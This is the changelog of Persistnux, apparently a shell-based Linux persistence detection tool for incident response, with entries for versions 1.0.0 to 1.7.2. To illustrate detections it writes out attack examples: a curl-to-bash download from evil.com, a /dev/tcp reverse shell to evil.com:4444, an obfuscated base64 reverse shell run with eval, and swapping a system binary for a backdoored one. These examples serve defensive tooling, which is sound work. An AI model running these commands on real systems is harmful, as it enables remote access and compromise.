# Changelog

All notable changes to Persistnux will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [1.7.2] - 2026-01-28

### Fixed
- **#4: Interpreter Flag Parsing Bug**: Fixed unreachable code for `-m` flag (Python module flag)
  - Previous: `-m` flag check was after general flag skip, making it unreachable
  - Now: `-m` and `-c` checks happen before general flag skip
  - Impact: Commands like `python3 -m http.server` no longer try to analyze "http.server" as a file

- **#8: Variable Regex Enhancement**: Improved detection of quoted strings with spaces
  - Previous: `=([^[:space:]]{30,})` only matched unquoted strings without spaces
  - Now: Matches both `="quoted string"` and `='single quotes'` with spaces inside
  - Impact: Catches obfuscated payloads like `payload="YmFz aCAt aSA+"` (base64 with spaces)

### Added
- **#6: Package Verification for ALL Executables**: Extended package checking beyond service files
  - Now checks executables/scripts being executed, not just service files
  - Detects modified package binaries: `/usr/bin/python3` tampered → CRITICAL confidence
  - Flags unmanaged executables in suspicious locations: `/tmp/backdoor` → HIGH confidence

- **#7: Interpreter Binary Verification**: Verifies interpreter binaries aren't compromised
  - Checks if `/usr/bin/python3` itself is package-managed and unmodified
  - Detects backdoored interpreters: Modified `/usr/bin/python3` → CRITICAL confidence
  - Flags unmanaged interpreters: `/opt/custom/python3` → HIGH confidence

- **#3: Regex-Based Interpreter Detection**: Replaced hardcoded array with regex patterns
  - Previous: Hardcoded versions (python3.10, python3.11, python3.12)
  - Now: Regex patterns (`^python[0-9.]*$`, `^pypy[0-9]*$`)
  - Impact: Automatically detects python3.13, python3.14, pypy3, perl5.36, etc.
  - Added support for: pypy, gawk, mawk, ksh93, lua5.4, php8

- **#11: Interpreter Detection for Cron Jobs**: Extended interpreter analysis to cron
  - Cron entries like `* * * * * root /usr/bin/python3 /tmp/backdoor.py` now analyzed
  - Extracts script path from cron command and analyzes content
  - Same detection logic as systemd: checks script content, package status, location

- **#12: Progress Indicators**: Added [X/8] progress counters to detection modules
  - Shows: `[1/8] Checking systemd services...`, `[2/8] Checking cron jobs...`, etc.
  - Helps users track progress during long scans

### Changed
- **#9: Extended Shannon Entropy Range**: Adjusted hybrid entropy thresholds
  - Previous: AWK for 30-99 chars, gzip for 100+ chars
  - Now: AWK for 30-199 chars, gzip for 200+ chars
  - Rationale: AWK is more accurate for medium-length strings; gzip better for very long strings
  - Impact: Reduces false positives from normal text (100-150 chars) being analyzed with gzip

- **#5: Gzip Fallback to AWK**: Added robustness for systems without gzip
  - Checks if gzip exists before using compression method
  - Falls back to AWK Shannon entropy if gzip unavailable or fails
  - Ensures entropy calculation works on minimal systems

- **#10: MIN_CONFIDENCE Validation**: Added input validation for confidence filter
  - Valid values: LOW, MEDIUM, HIGH
  - Invalid input: Shows warning, uses default (MEDIUM)
  - Example: `MIN_CONFIDENCE=INVALID` → Warning + fallback to MEDIUM

### Optimized
- **#13: Selective Hashing**: Deferred hash calculation until after filtering
  - Previous: Computed SHA256 hash for every file, even if filtered out
  - Now: Uses "DEFER" placeholder, computes hash only for reported findings
  - Impact: Significant performance improvement when using `MIN_CONFIDENCE=HIGH` filter

### Security Impact

**Attack Scenarios Now Detected**:

1. **Backdoored System Binary**:
   ```systemd
   ExecStart=/usr/bin/python3 /opt/legitimate.py
   # If /usr/bin/python3 was replaced with trojan → v1.7.2: CRITICAL
   ```

2. **Modified Package Executable**:
   ```systemd
   ExecStart=/usr/bin/curl https://example.com
   # If /usr/bin/curl was tampered with → v1.7.2: CRITICAL
   ```

3. **Cron with Malicious Script**:
   ```cron
   * * * * * root /usr/bin/python3 /tmp/backdoor.py
   # v1.7.2: Extracts /tmp/backdoor.py → Analyzes content → HIGH
   ```

4. **Obfuscated Payload with Spaces**:
   ```bash
   payload="YmFz aCAt aSA+"  # Base64 with spaces to evade detection
   # v1.7.2: Improved regex catches quoted strings → HIGH entropy detected
   ```

### Migration Notes

**For Users**:
- No breaking changes
- All fixes are backward compatible
- Improved detection may increase findings (fewer false negatives)

**For Analysts**:
- Review CRITICAL findings first (modified package files)
- Check for backdoored interpreters (`/usr/bin/python3` modified)
- Validate cron-based interpreter persistence

## [1.7.1] - 2026-01-26

### Changed
- **Entropy Calculation: Hybrid Shell-Only Approach**
  - Removed Python dependency for entropy calculation
  - Implemented hybrid approach using only standard Linux tools (gzip + AWK)
  - **Short strings (30-99 chars)**: AWK Shannon entropy (accurate)
  - **Long strings (100+ chars)**: gzip compression ratio (fast, no Python needed)
  - Strings < 30 chars: Skipped (insufficient data)
  - Performance: ~5ms for long strings (gzip), ~18ms for short strings (AWK)
  - Pure shell implementation ensures compatibility with minimal Linux systems

### Security Rationale

**Why Shell-Only Implementation Matters**:
The tool is designed for DFIR investigations on potentially compromised or minimal Linux systems. Depending on Python creates several issues:

1. **Compromised systems**: Attackers may remove Python after establishing persistence
2. **Minimal installations**: Embedded systems, containers, rescue environments may lack Python
3. **Trust issues**: On compromised systems, can we trust the Python interpreter hasn't been modified?
4. **Performance**: Spawning Python process adds 50ms overhead per call

**Hybrid Approach Benefits**:
- ✅ Works on ANY Linux system (gzip and AWK are POSIX standard)
- ✅ Faster for long strings (gzip) without sacrificing accuracy for short strings (AWK)
- ✅ No external dependencies beyond core utilities
- ✅ Compression ratio directly correlates with entropy for malware detection purposes

**Mapping Details**:
| Compression Ratio | Entropy Range | Interpretation | Example |
|-------------------|---------------|----------------|---------|
| 0.0 - 0.4 | 2.0 - 3.5 | Low (compressible) | Repetitive text, "aaaa" |
| 0.4 - 0.7 | 3.5 - 4.5 | Medium (normal text) | English text, logs |
| 0.7 - 0.9 | 4.5 - 6.0 | High (encoded) | Base64, URL encoding |
| 0.9 - 1.0+ | 6.0 - 8.0 | Very High (random) | Encrypted, truly random |

## [1.7.0] - 2026-01-25

### Added
- **Interpreter Argument Analysis**: Critical fix for the "Python/Perl Problem"
  - New array `KNOWN_INTERPRETERS`: List of interpreters (python, perl, bash, ruby, node, php, java, lua)
  - New function `is_interpreter()`: Detects if executable is an interpreter
  - New function `get_script_from_interpreter_command()`: Extracts script file path from interpreter arguments
  - Analyzes the **script being executed**, not just the interpreter binary
  - Handles interpreter flags: `-c` (inline code), `-m` (Python modules), etc.
  - Checks if script file is package-managed/modified
  - Flags scripts in suspicious locations: `/tmp`, `/dev/shm`, `/var/tmp`

### Fixed
- **CRITICAL BLIND SPOT**: Interpreter-based persistence now properly detected
  - Previous: `ExecStart=/usr/bin/python3 /opt/malware.py` → Analyzed `/usr/bin/python3` → LOW confidence ❌
  - Now: Extracts `/opt/malware.py` → Analyzes script content → HIGH/CRITICAL confidence ✅
  - Inline code detection: `python3 -c 'malicious code'` → HIGH confidence
  - Modified script detection: Package-managed script that was tampered with → CRITICAL

### Security Rationale

**The Python/Perl Problem**:
Attackers frequently use system interpreters to execute malicious scripts, knowing that the interpreter itself (`/usr/bin/python3`) is package-managed and trusted.

**Attack Example Prevented**:
```systemd
# Service file: /etc/systemd/system/backup.service
[Service]
ExecStart=/usr/bin/python3 /opt/app/backdoor.py --daemon

# backdoor.py contains reverse shell code
```

**Detection**:
- v1.6: Checks `/usr/bin/python3` → Package-managed → **LOW confidence** ❌ (MISSED)
- v1.7: Detects python interpreter → Extracts `/opt/app/backdoor.py` → Analyzes script → **HIGH confidence** ✅

**Additional Scenarios Caught**:

1. **Inline Code Execution**:
```bash
ExecStart=/usr/bin/python3 -c 'import socket;...'
# v1.7: Detects -c flag → HIGH confidence
```

2. **Suspicious Script Locations**:
```bash
ExecStart=/usr/bin/perl /tmp/payload.pl
# v1.7: Script in /tmp → HIGH confidence
```

3. **Modified Python Scripts**:
```bash
ExecStart=/usr/bin/python3 /usr/lib/python3/dist-packages/module.py
# If module.py was modified:
# v1.7: dpkg --verify detects modification → CRITICAL confidence
```

### Improved
- **Interpreter Detection**: Covers 20+ interpreter variants (python2.7, python3.11, perl5, nodejs, etc.)
- **Argument Parsing**: Correctly handles complex command lines with flags and options
- **Location-Based Scoring**: Scripts in `/tmp`, `/dev/shm` automatically flagged HIGH
- **Inline Code Detection**: `-c` flag usage marked as inherently suspicious

## [1.6.0] - 2026-01-25

### Added
- **Package Integrity Verification**: Enhanced `is_package_managed()` with `dpkg --verify` and `rpm -V`
  - Detects when package-managed files have been modified/tampered with
  - Returns special code (2) for modified files vs unmanaged (1) or clean (0)
  - Modified package files get **CRITICAL** confidence (potential rootkit/compromise)
- **Entropy Analysis for Obfuscation Detection**: New anti-evasion capability
  - New function `calculate_entropy()`: Shannon entropy calculation for strings
  - New function `is_high_entropy()`: Detects suspiciously random/encoded data
  - Integrated into `analyze_script_content()`: automatically flags high-entropy variable assignments
  - Catches obfuscation techniques that bypass regex: variable substitution, high-ASCII chars, encrypted payloads
  - Threshold: 4.5 bits (base64 ≈ 6.0, truly random ≈ 7.9)

### Fixed
- **CRITICAL SECURITY FIX**: Fixed dangerous logic gap in `is_command_safe()`
  - **Previous flaw**: `/usr/bin/evil_miner` was marked SAFE just because path starts with `/usr/bin/`
  - **New logic**: Path is only safe if BOTH in standard location AND package-managed
  - Prevents attackers from dropping malware in system directories and having it whitelisted
  - Path validation now requires: 1) Match known-good path, 2) Verify package-managed, 3) Verify not modified

### Changed
- **Enhanced Package Verification**: `is_package_managed()` return codes
  - 0 = Package-managed and verified intact
  - 1 = Unmanaged (not in package database)
  - 2 = Package-managed but MODIFIED (tampering detected)
- **Modified File Handling**: Files flagged as MODIFIED always get CRITICAL confidence
  - Example: `/usr/bin/ssh` modified → CRITICAL (possible rootkit)
- **Path Whitelisting Logic**: Two-factor validation required
  - Old: "Is it in `/usr/bin/`?" → Safe
  - New: "Is it in `/usr/bin/` AND package-managed AND unmodified?" → Safe

### Security Rationale

**Why Package Verification Matters**:
Attackers with root access often replace system binaries as part of rootkit installation. Checking `dpkg -S` alone only verifies the file is in the package database - not that it hasn't been tampered with.

**Attack Example Prevented**:
```bash
# Attacker replaces legitimate system binary with backdoored version
cp /usr/bin/ssh /usr/bin/ssh.orig
cp /path/to/backdoored_ssh /usr/bin/ssh

# v1.5: dpkg -S /usr/bin/ssh → openssh-client → Marked SAFE
# v1.6: dpkg --verify openssh-client → MODIFIED → CRITICAL confidence
```

**Why Path Validation Fix Matters**:
The old logic created a massive blind spot - any file dropped in `/usr/bin/` was automatically trusted.

**Attack Example Prevented**:
```bash
# Attacker drops cryptominer in system directory
cp /tmp/evil_miner /usr/bin/system-monitor

# Create systemd service
cat > /etc/systemd/system/monitor.service << EOF
[Service]
ExecStart=/usr/bin/system-monitor --daemon
EOF

# v1.5: Path matches ^/usr/bin/ → Marked SAFE → LOW confidence
# v1.6: Path matches but dpkg -S fails → NOT automatically safe → HIGH confidence
```

**Why Entropy Analysis Matters**:
Smart attackers avoid obvious patterns like `base64 -d` by using variable substitution or raw binary data.

**Attack Example Prevented**:
```bash
#!/bin/bash
# Obfuscated reverse shell - no obvious "base64" keyword
p="YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xLjEvNDQ0NCAwPiYx"
eval $(echo $p|base64 -d)

# v1.5: Regex doesn't match "base64 -d" → Missed
# v1.6: Entropy analysis detects p= has entropy 6.2 → HIGH confidence
```

### Improved
- **Rootkit Detection**: Modified system binaries now flagged as CRITICAL
- **False Negative Reduction**: Malware in system directories no longer auto-whitelisted
- **Obfuscation Resistance**: Entropy analysis catches encoding/encryption missed by regex
- **Confidence Accuracy**: Modified packages get CRITICAL, unverified paths don't get free pass

## [1.5.0] - 2026-01-25

### Added
- **Script Content Analysis**: Deep inspection of script files executed by persistence mechanisms
  - New function `is_script()`: Detects if a file is a script vs binary/ELF
  - New function `analyze_script_content()`: Reads and analyzes script content for malicious patterns
  - Integrated into systemd service detection: analyzes scripts pointed to by ExecStart
  - Integrated into cron job detection: analyzes cron scripts for suspicious content
  - Detects obfuscation techniques: base64 decode, encryption, eval/exec with variables
  - Detects reverse shell techniques: mkfifo, socat, netcat listeners, /proc/self/exe tricks
  - Detects download-execute patterns: curl/wget command substitution, chmod +x in /tmp
  - Detects scripting language one-liners: python -c, perl -e, ruby -e, awk system()

### Security Rationale
**Why This Matters**: Attackers often hide malicious code inside seemingly innocent scripts. Previously, Persistnux only checked the ExecStart command line itself. Now it reads and analyzes the actual script content to detect obfuscated or sophisticated attacks.

**Example Attack Prevented**:
```systemd
# Service file: /etc/systemd/system/backup.service
# ExecStart=/usr/local/bin/backup.sh (looks innocent)

# backup.sh contains:
#!/bin/bash
curl -s http://evil.com/payload | base64 -d | bash

# v1.4: Would be LOW/MEDIUM confidence (path looks safe, package-unmanaged)
# v1.5: Detected as HIGH confidence (script contains curl|bash and base64 decode)
```

### Improved
- **Higher detection accuracy**: Malicious scripts are now detected even if the ExecStart path looks innocent
- **Fewer false negatives**: Obfuscated attacks hiding in scripts are now caught
- **Better confidence scoring**: Scripts with suspicious content automatically get HIGH confidence

## [1.4.0] - 2026-01-24

### Changed
- **Restructured CSV/JSONL Output**: More analyst-friendly format with dedicated columns
  - Old format: cramped pipe-delimited strings in description/metadata fields
  - New format: dedicated columns for command, file_owner, file_permissions, file_age_days, enabled_status
  - Better Excel compatibility: easier filtering, sorting, and pivot tables
  - Better SIEM integration: structured fields for Splunk/ELK queries

### New CSV Columns
- `timestamp`: ISO 8601 format timestamp
- `hostname`: System hostname
- `category`: Persistence mechanism type
- `confidence`: LOW/MEDIUM/HIGH/CRITICAL
- `file_path`: Full path to persistence file
- `file_hash`: SHA256 hash
- `file_owner`: Owner username
- `file_permissions`: Octal permissions
- `file_age_days`: Days since last modification
- `package_status`: Package manager status (dpkg:package-name, rpm:package-name, or unmanaged)
- `command`: Actual command being executed
- `enabled_status`: For systemd services (enabled/disabled)
- `description`: Human-readable summary

### Added
- New function `escape_json()`: Properly escapes special characters in JSONL output
- New function `add_finding_new()`: Structured output function with dedicated parameters
- Backward compatibility wrapper: Old `add_finding()` calls automatically converted to new format

### Improved
- **Analyst workflow**: Easier to sort by confidence, filter by owner, search by command
- **Data analysis**: Clean columns enable SQL queries, pandas DataFrames, Excel formulas
- **JSONL robustness**: Proper escaping prevents parsing errors from quotes/newlines in file content

## [1.3.0] - 2026-01-23

### Changed
- **SECURITY IMPROVEMENT**: Replaced name-based service whitelisting with content-based validation
  - Removed `KNOWN_GOOD_SERVICES` array (service name whitelist)
  - Added `KNOWN_GOOD_EXECUTABLE_PATHS` array (trusted binary paths)
  - Added `KNOWN_GOOD_COMMAND_PATTERNS` array (safe command patterns)
  - Added `NEVER_WHITELIST_PATTERNS` array (always malicious patterns)
- **New Function**: `is_command_safe()` replaces `is_known_good_service()`
  - Validates based on what is being executed, not the service name
  - Prevents attackers from hiding malicious commands in legitimate-sounding service names
  - Three-tier validation: 1) Check for dangerous patterns, 2) Check for safe paths, 3) Check for safe patterns

### Security Rationale
**Why This Matters**: Attackers can easily create services named `systemd-update.service` or `dbus-monitor.service` to bypass name-based filtering. Content-based validation ensures that even if the service name looks legitimate, the actual command being executed is analyzed.

**Example Attack Prevented**:
```systemd
# Service name: systemd-timesync.service (looks legitimate)
# ExecStart: /bin/bash -c 'bash -i >& /dev/tcp/evil.com/4444'
# v1.2: Would be whitelisted by name
# v1.3: Detected as HIGH confidence (dangerous command pattern)
```

### Improved
- More accurate detection: Legitimately named services with malicious commands now detected
- Fewer false negatives: Mimicked service names no longer bypass detection
- Better confidence scoring: Safe system binaries automatically get LOW confidence

## [1.2.0] - 2026-01-23

### Added
- **False Positive Reduction**: Package manager integration to identify files managed by dpkg/rpm
- **Known-Good Service Whitelist**: Automatic filtering of common legitimate services (systemd-*, dbus-*, snap.*, etc.)
- **Suspicious-Only Filter Mode** (DEFAULT): By default, only shows MEDIUM/HIGH/CRITICAL findings
- **Command-Line Arguments**: Added `--help`, `--all`, `--min-confidence` options
- **Flexible Filtering**: Environment variables `FILTER_MODE` and `MIN_CONFIDENCE` for output control
- **Package Status in Output**: Additional info field now includes package management status
- Function `is_package_managed()`: Checks if files are managed by package managers
- Function `is_known_good_service()`: Checks if systemd service matches known-good patterns
- Function `adjust_confidence_for_package()`: Downgrades confidence for package-managed files
- Function `should_include_finding()`: Filters findings based on confidence and mode
- Function `show_usage()`: Comprehensive help text with examples
- Known-good service patterns array with 30+ common legitimate services
- Enhanced documentation in README.md explaining filtering and false positive reduction

### Changed
- **DEFAULT BEHAVIOR**: Now shows only suspicious findings (MEDIUM/HIGH/CRITICAL) instead of all findings
- Confidence scoring now considers package management status
- Package-managed files with HIGH confidence are downgraded to MEDIUM
- Package-managed files with MEDIUM confidence are downgraded to LOW
- Known vendor services are now automatically skipped during systemd detection
- Output now includes package information (e.g., "package=dpkg:openssh-server" or "package=unmanaged")
- Banner now displays active filter mode and minimum confidence level

### Improved
- **Dramatically reduced output noise**: LOW confidence baseline findings hidden by default
- Reduced false positives from legitimate distribution-managed persistence mechanisms
- More accurate confidence scoring for DFIR investigations
- Better signal-to-noise ratio for HIGH confidence findings
- Faster triage: analysts can immediately focus on suspicious items
- Backward compatible: use `--all` to see all findings like v1.1

## [1.1.0] - 2026-01-23

### Fixed
- **CRITICAL BUG FIX**: Fixed script exiting prematurely after first finding
  - Changed `((FINDINGS_COUNT++))` to `FINDINGS_COUNT=$((FINDINGS_COUNT + 1))` in `log_finding()`
  - This was causing the script to exit when `set -euo pipefail` encountered arithmetic returning 0
  - All findings now properly logged and written to output files

### Added
- Enhanced reverse shell detection patterns: `/dev/tcp/`, `/dev/udp/`
- Comprehensive suspicious pattern arrays based on PANIX and Elastic Security Labs research
- SUSPICIOUS_INDICATORS.md documentation
- DFIR_GUIDE.md for incident response workflows
- CONTRIBUTING.md for community contributions
- Example output files in examples/ directory

### Changed
- Updated detection patterns in all modules (systemd, cron, shell profiles)
- Improved time-based confidence scoring (files <7 days = HIGH)
- Enhanced grep patterns for reverse shell detection

## [1.0.0] - 2026-01-22

### Initial Release

#### Features
- Comprehensive Linux persistence detection across 7 major categories
- Live system analysis with bash script
- Dual output format: CSV and JSONL
- SHA256 file hashing for all detected files
- Detailed file metadata collection (permissions, ownership, timestamps)
- Confidence scoring system (LOW, MEDIUM, HIGH, CRITICAL)
- Root and non-root operation modes

#### Detection Modules
1. **Systemd Services**: Service files, timers, sockets across all systemd paths
2. **Cron Jobs**: System crontabs, user crontabs, at jobs, periodic scripts
3. **Shell Profiles**: System and user profile files, RC files, profile.d scripts
4. **SSH Persistence**: Authorized keys, SSH configs, daemon configuration
5. **Init Scripts**: rc.local, SysV init scripts, runlevel scripts
6. **Kernel & Preload**: LD_PRELOAD, kernel modules, dynamic linker configs
7. **Additional Mechanisms**: XDG autostart, environment files, sudoers, PAM, MOTD

#### Suspicious Pattern Detection
- Network-based reverse shell patterns (12 patterns)
- Download and execute commands (17 patterns)
- Suspicious file locations
- Obfuscation techniques

#### Output Features
- Timestamp for all findings
- Category and subcategory classification
- File location and description
- Confidence level
- SHA256 hash
- Detailed metadata string
- Additional contextual information

#### Documentation
- Comprehensive README.md
- Usage examples
- DFIR workflow integration guides
- Requirements and installation instructions

---

## Version History Summary

- **v1.2.0**: False positive reduction with package manager integration
- **v1.1.0**: Critical bug fix + enhanced detection patterns
- **v1.0.0**: Initial release with comprehensive persistence detection
